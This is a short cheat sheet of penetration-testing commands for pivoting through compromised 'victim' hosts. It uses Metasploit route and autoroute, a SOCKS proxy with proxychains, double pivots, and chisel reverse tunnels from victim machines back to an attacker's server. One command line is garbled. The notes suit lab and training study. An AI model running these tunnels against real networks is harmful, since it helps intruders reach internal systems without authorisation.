## Pivot
In this case victim 1, in  subnet 2, is initialy used to contact victim 2, in subnet 2.
But after the reverse shell is ran, the communication is made between the attacker and victim 2.

**Method 1**

	msf > route add [ip] [net mask] [session]
	msf > route add 10.10.10.0 255.255.255.0 2
	msf > route print
	msf > route flush

**Method 2**

	meterpreter > run autoroute -s 10.10.10.0/24
	meterpreter > run autoroute -p #show routing table

**Method 3**

	msf > use post/windows/manage/autoroute
	msf > set session [session]
	msf > set subnet [subnet] #subnet is the subnet that we wish to access
	msf > run
	msf > route flush
## Use routing table to run external tools
	meterpreter > use auxiliary/server/socks_proxy
	add socks4 $ip 1080 to proxychains4.conf
	proxychains [command]

## Pivot if there's no internet access for victim 2
In this case victim 1, in subnet 1, is used as a proxy to access subnet 2 so we can contact, through victim 1, victim 2.

	msf > use post/windows/manage/autoroute
	msf > set session [session] 
	set sumsf > bnet [subnet1]
	msf > run
	msf > use post/windows/manage/autoroute
	msf > set session [session]
	msf > set subnet [subnet2]
	msf > run
	exploit using LHOST with the IP of victim 1 

## Pivot with VPNPivot
	https://github.com/0x36/VPNPivot

## Pivot with chisel

### Method 1
#### Attacker
 
	chisel server --socks5 --reverse
	
#### Victim
	chisel client --fingerprint [fingerprint] [chisel server ip]:[chisel server port] R:socks

#### Attacker
	sudo nano /etc/proxychains4.conf
		add socks5	127.0.0.1 [chisel server port]

### Method 2

#### Attacker
	chisel server --reverse

#### Victim

	chisel client --fingerprint [fingerprint] [chisel server ip]:[chisel server port] R:[attack port to forward to]:[victim ip]:[victim port]


